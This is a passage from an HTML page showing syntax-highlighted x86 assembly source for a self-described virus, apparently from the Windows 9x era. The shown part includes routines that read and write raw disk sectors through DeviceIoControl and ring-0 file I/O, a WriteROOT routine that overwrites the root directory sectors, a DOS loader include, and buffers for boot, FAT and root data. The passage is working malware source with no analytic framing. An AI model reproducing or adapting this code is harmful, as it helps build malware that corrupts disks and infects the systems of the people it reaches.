    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ROOT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Int26h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DE00h</span><span class="sc0">             </span><span class="sc1">;write sectors</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">irfio</span><span class="sc0">   
</span><span class="sc5">Int25h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DD00h</span><span class="sc0">             </span><span class="sc1">;read sectors</span><span class="sc0">
</span><span class="sc5">irfio</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WriteROOT</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;code used to write sectorz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regEBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ROOT</span><span class="sc0">       </span><span class="sc1">;pointer to ROOT field</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regEDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">            </span><span class="sc1">;sector number of ROOT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regECX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">            </span><span class="sc1">;sectors to write</span><span class="sc0">
</span><span class="sc5">I26h</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">p2526</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">              </span><span class="sc1">;set WRITE mode</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i2526</span><span class="sc0">               </span><span class="sc1">;continue</span><span class="sc0">
</span><span class="sc5">I25h</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">p2526</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">;set READ mode</span><span class="sc0">
</span><span class="sc5">i2526</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regEAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;zero EAX</span><span class="sc0">
</span><span class="sc5">I25hSimple</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regCont</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regCont</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">p2526</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">d_handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeviceIoControl</span><span class="sc0">            </span><span class="sc1">;backdoor used to call DOS services</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">q2526h</span><span class="sc0">                </span><span class="sc1">;yeah, set CF and quit</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">                 </span><span class="sc1">;clear CF</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;quit</span><span class="sc0">
</span><span class="sc5">q2526h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">                 </span><span class="sc1">;set CF</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">


    </span><span class="sc5">loader</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;DOS loader</span><span class="sc0">
    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">loader.inc</span><span class="sc0">
    </span><span class="sc5">ldrsize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">loader</span><span class="sc0">          </span><span class="sc1">;size of DOS loader</span><span class="sc0">
    </span><span class="sc5">membase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc12">'YYYY'</span><span class="sc0">      </span><span class="sc1">;address, where is virus placed in memory</span><span class="sc0">
    </span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'Y'</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;filename</span><span class="sc0">
    </span><span class="sc5">save</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'Y'</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;save area</span><span class="sc0">
    </span><span class="sc5">BOOT</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'Y'</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;BOOT</span><span class="sc0">
    </span><span class="sc5">FAT</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4608</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'Y'</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;FAT</span><span class="sc0">
    </span><span class="sc5">ROOT</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7168</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'Y'</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;ROOT</span><span class="sc0">
</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;virus ends here</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                        </span><span class="sc1">;end of code section</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">                   </span><span class="sc1">;thats all f0lx ;)</span><span class="sc0">
</span></div></body>
</html>
